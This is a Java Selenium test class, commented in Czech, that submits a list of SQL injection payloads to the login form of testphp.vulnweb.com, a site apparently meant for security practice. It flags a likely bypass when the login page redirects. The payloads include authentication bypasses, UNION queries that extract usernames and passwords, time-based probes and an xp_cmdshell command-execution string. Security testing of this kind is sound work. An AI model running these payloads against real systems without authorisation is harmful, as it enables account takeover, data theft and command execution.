package UI;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;

import io.github.bonigarcia.wdm.WebDriverManager;

public class SQLInjectionTest {

	public static String browser = "Chrome"; // nebo "Edge"
	public static WebDriver driver;

	public static void setUpDriver() {
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize();
	}

	// Krátká pauza mezi pokusy
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		setUpDriver();
		System.out.println("🧪 Spuštěn SQL Injection test");

		// Seznam běžných SQLi payloadů pro testování
		String[] sqlPayloads = {
				// Základní bypassy
				"' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", "' OR ''='", "admin' --",
				"' OR 'x'='x", "' or ''='", "'='", "1'1", "' OR 'test'='test", "' OR 1=1 ORDER BY 1--",
				"\" OR \"1\"=\"1", "' OR 1=CONVERT(int, '1')--",

				// Kombinace logických výrazů
				"' OR 1=1 AND ''='", "' OR 1=1 AND 'a'='a", "' OR 1=1 AND 1=1--", "' OR 1=1 AND sleep(2)--",
				"' AND 1=0 UNION SELECT NULL--",

				// Union selecty (pokročilejší útoky)
				"' UNION SELECT null, null, null--", "' UNION SELECT 1, 'admin', 'password'--",
				"' UNION SELECT username, password FROM users--", "' UNION SELECT 1,2,3,4--",
				"' UNION SELECT version(), database()--",

				// Time-based testy
				"' OR SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM users) = '1' AND SLEEP(3)--",

				// Nested subqueries
				"' OR (SELECT COUNT(*) FROM users) > 0 --",
				"' AND (SELECT 1 FROM dual WHERE EXISTS (SELECT * FROM users))--",
				"' AND (SELECT 1 FROM information_schema.tables)--",

				// Obfuskace (zakódované varianty)
				"%27%20OR%20%271%27%3D%271", "%27%20OR%20%271%27%3D%271%27--", "%27%20OR%20%271%27%3D%271%27%23",

				// Přetížení SQL parseru
				"'; EXEC xp_cmdshell('dir'); --", "' AND 1=(SELECT COUNT(*) FROM tabname); --",
				"' OR 1 GROUP BY CONCAT(username, ':', password) --",

				// Trolly / edge case
				"'||(SELECT '')||'", "'/**/OR/**/'1'='1", "' OR true--" };

		int maxAttempts = sqlPayloads.length;

		for (int i = 0; i < maxAttempts; i++) {
			driver.get("https://testphp.vulnweb.com/login.php");
			System.out.println("🔁 Pokus #" + (i + 1) + " s payloadem: " + sqlPayloads[i]);

			WebElement username = driver.findElement(By.name("uname"));
			WebElement password = driver.findElement(By.name("pass"));
			WebElement loginBtn = driver.findElement(By.name("login"));

			username.clear();
			password.clear();

			username.sendKeys(sqlPayloads[i]);
			password.sendKeys(sqlPayloads[i]); // Použijeme stejný payload pro obě pole
			loginBtn.click();

			pause(2); // čekání na reakci

			String currentUrl = driver.getCurrentUrl();
			if (!currentUrl.contains("login.php")) {
				System.out.println("🚨 Možná úspěšná SQL injection! URL: " + currentUrl);
				break; // přihlašování uspělo – stačí jeden zásah
			} else {
				System.out.println("❌ Login selhal, vstup odmítnut.");
			}
		}

		driver.quit();
		System.out.println("🔚 Test dokončen.");
	}
}
